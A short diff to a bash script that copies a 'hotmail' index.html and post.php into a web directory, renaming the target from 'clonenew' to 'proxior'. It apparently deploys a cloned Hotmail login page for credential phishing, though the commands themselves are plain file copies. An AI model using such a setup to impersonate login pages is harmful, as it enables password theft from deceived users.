@@ -1,5 +1,5 @@
 #!/bin/bash
 
-cp -avr /var/www/clonenew/default/hotmail/index.html /var/www/clonenew/
-cp -avr /var/www/clonenew/default/hotmail/post.php /var/www/clonenew/
+cp -avr /var/www/proxior/default/hotmail/index.html /var/www/proxior/
+cp -avr /var/www/proxior/default/hotmail/post.php /var/www/proxior/
 
